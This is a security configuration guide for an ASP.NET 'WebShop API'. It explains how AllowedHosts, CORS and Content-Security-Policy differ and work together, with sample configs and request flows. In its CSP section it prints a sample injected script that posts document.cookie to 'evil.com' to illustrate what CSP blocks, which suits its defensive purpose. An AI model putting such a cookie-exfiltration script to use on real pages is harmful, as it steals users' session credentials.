# Security Configuration Comparison Guide

This guide explains the differences and relationships between various security configurations in the WebShop API, including AllowedHosts, CSP, CORS, and other security headers. It clarifies what each does, when they apply, and whether there's overlap.

[← Back to README](../../README.md)

## Table of Contents

- [Overview](#overview)
- [Quick Comparison Table](#quick-comparison-table)
- [Detailed Comparison](#detailed-comparison)
- [When Each Applies](#when-each-applies)
- [Overlap Analysis](#overlap-analysis)
- [How They Work Together](#how-they-work-together)
- [Configuration Summary](#configuration-summary)

## Overview

The WebShop API uses multiple security mechanisms that operate at different layers and protect against different threats. Understanding the differences helps avoid confusion and ensures proper configuration.

**Key Security Configurations:**

1. **AllowedHosts** - Validates the `Host` header in **incoming requests**
2. **CORS (CorsOptions)** - Controls **cross-origin requests** from browsers
3. **CSP (Content-Security-Policy)** - Controls **resource loading** in browsers and prevents clickjacking via `frame-ancestors` directive
4. **Other Security Headers** - Various response headers for additional protection

**Important:** These mechanisms operate at **different layers** and protect against **different threats**. They complement each other but do **not overlap** in their primary functions.

## Quick Comparison Table

| Security Mechanism | Type | When Applied | What It Protects | Configuration Location |
|-------------------|------|--------------|------------------|----------------------|
| **AllowedHosts** | Request validation | Server-side, before processing | Host header injection, cache poisoning | `appsettings.json` → `AllowedHosts` |
| **CORS** | Request/Response headers | Browser + Server | Cross-origin request blocking | `appsettings.json` → `CorsOptions` |
| **CSP** | Response header | Browser (client-side) | XSS attacks, resource loading, clickjacking (via `frame-ancestors`) | Middleware (response header) |

## Detailed Comparison

### 1. AllowedHosts

**What it is:**

- Server-side validation of the `Host` HTTP header in incoming requests
- Built into ASP.NET Core framework
- Validates **before** request is processed

**What it protects:**

- Host header injection attacks
- Cache poisoning
- Password reset poisoning
- Open redirect vulnerabilities

**When it applies:**

- ✅ **Server-side** - Before request processing
- ✅ **All requests** - HTTP/HTTPS, any client
- ❌ **Not browser-specific** - Works for all clients (browsers, mobile apps, API clients)

**Configuration:**

```json
{
  "AllowedHosts": "api.example.com;www.api.example.com"
}
```

**Example:**

```http
GET /api/v1/customers HTTP/1.1
Host: evil.com  ← Validated against AllowedHosts
```

If `evil.com` is not in `AllowedHosts`, server returns `400 Bad Request`.

**Key Point:** This is **server-side request validation**, not a response header.

---

### 2. CORS (CorsOptions)

**What it is:**

- Cross-Origin Resource Sharing - Controls which origins can make cross-origin requests
- Browser-enforced security mechanism
- Uses both request headers (from browser) and response headers (from server)

**What it protects:**

- Unauthorized cross-origin requests
- Data leakage to untrusted origins
- CSRF attacks (when combined with other measures)

**When it applies:**

- ✅ **Browser requests** - Only enforced by browsers
- ✅ **Cross-origin requests** - Same-origin requests are not affected
- ❌ **Not for server-to-server** - API-to-API calls are not affected
- ❌ **Not for mobile apps** - Native mobile apps are not affected

**Configuration:**

```json
{
  "CorsOptions": {
    "AllowedOrigins": ["https://frontend.example.com"],
    "AllowedMethods": ["GET", "POST"],
    "AllowedHeaders": ["Authorization", "Content-Type"],
    "AllowCredentials": false
  }
}
```

**Example:**

```javascript
// Frontend at https://frontend.example.com
fetch('https://api.example.com/api/v1/customers', {
  headers: { 'Authorization': 'Bearer token' }
})
```

Browser checks CORS policy:

- Is `https://frontend.example.com` in `AllowedOrigins`? ✅
- Is `GET` in `AllowedMethods`? ✅
- Is `Authorization` in `AllowedHeaders`? ✅
- Request allowed → Browser sends request

**Key Point:** This is **browser-enforced** and only affects **cross-origin browser requests**.

---

### 3. CSP (Content-Security-Policy)

**What it is:**

- Response header that tells browsers which resources can be loaded
- Browser-enforced security mechanism
- Controls script execution, resource loading, iframe embedding

**What it protects:**

- XSS (Cross-Site Scripting) attacks
- Code injection attacks
- Clickjacking (via `frame-ancestors` directive)
- Unauthorized resource loading

**When it applies:**

- ✅ **Browser responses** - Only enforced by browsers
- ✅ **HTML content** - Primarily for HTML pages
- ⚠️ **JSON APIs** - Less critical, but still recommended
- ❌ **Not for server-to-server** - API-to-API calls are not affected

**Configuration:**

```csharp
// In middleware
context.Response.Headers.Append("Content-Security-Policy", 
    "default-src 'self'; frame-ancestors 'none'");
```

**Example:**

```html
<!-- Malicious script in API response -->
<script>
  fetch('https://evil.com/steal', {method: 'POST', body: document.cookie});
</script>
```

Browser checks CSP:

- Is `https://evil.com` allowed in `connect-src`? ❌
- Script blocked → Attack prevented

**Key Point:** This is a **response header** that browsers enforce on **client-side resource loading**. The `frame-ancestors` directive in CSP provides clickjacking protection and replaces the legacy `X-Frame-Options` header.

---

## When Each Applies

### Request Flow

```
1. Client sends request
   ↓
2. [AllowedHosts] ← Validates Host header (SERVER-SIDE)
   ↓
3. Server processes request
   ↓
4. Server sends response with headers:
   - CORS headers (Access-Control-Allow-Origin, etc.)
   - CSP header (Content-Security-Policy with frame-ancestors)
   ↓
5. Browser receives response
   ↓
6. [CORS] ← Browser checks if cross-origin request is allowed (BROWSER-SIDE)
   ↓
7. [CSP] ← Browser enforces resource loading policy and clickjacking protection (BROWSER-SIDE)
```

### Key Differences

| Mechanism | Applied By | When | Affects |
|-----------|-----------|------|---------|
| **AllowedHosts** | Server | Before request processing | All clients (browsers, mobile, API) |
| **CORS** | Browser | During cross-origin request | Browser requests only |
| **CSP** | Browser | When loading resources and embedding in iframes | Browser responses only |

## Overlap Analysis

### ❌ **No Direct Overlap**

These security mechanisms operate at **different layers** and protect against **different threats**:

1. **AllowedHosts** = Server-side request validation
2. **CORS** = Browser-side cross-origin request control
3. **CSP** = Browser-side resource loading control and clickjacking protection (via `frame-ancestors`)

### ⚠️ **Potential Confusion Areas**

#### 1. **CORS `AllowedOrigins` vs CSP `connect-src`**

**Overlap:** No, but can be confusing

- **CORS `AllowedOrigins`**: Which origins can **make requests** to your API
- **CSP `connect-src`**: Which URLs the **frontend application** can connect to (affects frontend, not API)

**Example:**

```json
// CORS: Frontend at https://frontend.com can call API
{
  "CorsOptions": {
    "AllowedOrigins": ["https://frontend.com"]
  }
}
```

```csharp
// CSP: Frontend can only make requests to 'self' (itself)
context.Response.Headers.Append("Content-Security-Policy", 
    "connect-src 'self'");
```

**Key Point:** CORS controls **incoming requests to API**, CSP `connect-src` controls **outgoing requests from frontend**.

#### 3. **AllowedHosts vs CORS `AllowedOrigins`**

**Overlap:** No, completely different

- **AllowedHosts**: Validates the `Host` header in the request (server-side)
- **CORS `AllowedOrigins`**: Controls which origins can make cross-origin requests (browser-side)

**Example:**

```http
# Request from frontend at https://frontend.com
GET /api/v1/customers HTTP/1.1
Host: api.example.com          ← Validated by AllowedHosts
Origin: https://frontend.com    ← Validated by CORS
```

- **AllowedHosts** checks: Is `api.example.com` allowed? ✅
- **CORS** checks: Is `https://frontend.com` in `AllowedOrigins`? ✅

**Key Point:** They validate **different headers** (`Host` vs `Origin`) at **different layers** (server vs browser).

#### 3. **CSP `frame-ancestors` for Clickjacking Protection**

**Note:** CSP's `frame-ancestors` directive is the modern replacement for the deprecated `X-Frame-Options` header. Use CSP `frame-ancestors` for clickjacking protection:

```csharp
// Modern approach (CSP)
context.Response.Headers.Append("Content-Security-Policy", 
    "default-src 'self'; frame-ancestors 'none'");
```

**Key Point:** CSP `frame-ancestors 'none'` prevents iframe embedding and provides clickjacking protection. This replaces the legacy `X-Frame-Options` header.

## How They Work Together

These security mechanisms **complement each other** to provide **defense-in-depth**:

### Defense Layers

```
Layer 1: AllowedHosts (Server-Side)
  ↓
  Protects: Host header injection, cache poisoning
  ↓
Layer 2: CORS (Browser-Side)
  ↓
  Protects: Unauthorized cross-origin requests
  ↓
Layer 3: CSP (Browser-Side)
  ↓
  Protects: XSS attacks, unauthorized resource loading, clickjacking (via frame-ancestors)
```

### Example Attack Scenario

**Attack:** Attacker tries to embed API in iframe and inject malicious script

**Defense:**

1. **AllowedHosts**: ✅ Validates `Host` header (prevents host header injection)
2. **CORS**: ✅ Blocks cross-origin requests from untrusted origins
3. **CSP**: ✅ Blocks malicious script execution and prevents iframe embedding (clickjacking protection)

**Result:** Attack blocked at multiple layers

## Configuration Summary

### Current Configuration in `appsettings.json`

```json
{
  // 1. AllowedHosts - Server-side Host header validation
  "AllowedHosts": "*",  // ⚠️ Should be specific hostnames in production

  // 2. CORS - Browser-side cross-origin request control
  "CorsOptions": {
    "AllowedOrigins": [
      "https://your-production-domain.com",
      "https://www.your-production-domain.com"
    ],
    "AllowedMethods": ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS"],
    "AllowedHeaders": [],  // Empty = allow all headers
    "AllowCredentials": false,
    "MaxAgeSeconds": 3600
  }

  // 3. CSP - Not yet configured (should be added in middleware)
}
```

### Recommended Complete Configuration

#### 1. AllowedHosts (appsettings.json)

```json
{
  "AllowedHosts": "api.example.com;www.api.example.com"
}
```

**Purpose:** Server-side Host header validation

#### 2. CORS (appsettings.json)

```json
{
  "CorsOptions": {
    "AllowedOrigins": ["https://frontend.example.com"],
    "AllowedMethods": ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS"],
    "AllowedHeaders": ["Authorization", "Content-Type", "api-version"],
    "AllowCredentials": false,
    "MaxAgeSeconds": 3600
  }
}
```

**Purpose:** Browser-side cross-origin request control

#### 3. CSP (Middleware)

```csharp
context.Response.Headers.Append("Content-Security-Policy", 
    "default-src 'self'; frame-ancestors 'none'");
```

**Purpose:** Browser-side resource loading control and clickjacking protection (via `frame-ancestors` directive)

## Summary

### Key Takeaways

1. **No Direct Overlap**: These mechanisms operate at different layers and protect against different threats
2. **Complementary**: They work together to provide defense-in-depth
3. **Different Layers**:
   - **Server-side**: AllowedHosts
   - **Browser-side**: CORS, CSP
4. **Different Headers**:
   - **AllowedHosts**: Validates `Host` header
   - **CORS**: Uses `Origin` header (request) and `Access-Control-Allow-Origin` (response)
   - **CSP**: Response header `Content-Security-Policy` (includes `frame-ancestors` for clickjacking protection)

### Configuration Checklist

- ✅ **AllowedHosts**: Configure specific hostnames (not `"*"` in production)
- ✅ **CORS**: Configure `AllowedOrigins` for frontend domains
- ✅ **CSP**: Add `frame-ancestors 'none'` for clickjacking protection (replaces deprecated X-Frame-Options)
- ✅ **Other Headers**: Add `X-Content-Type-Options`, `Referrer-Policy`, etc.

### No Conflicts

These configurations **do not conflict** with each other. They can and should all be used together for maximum security.
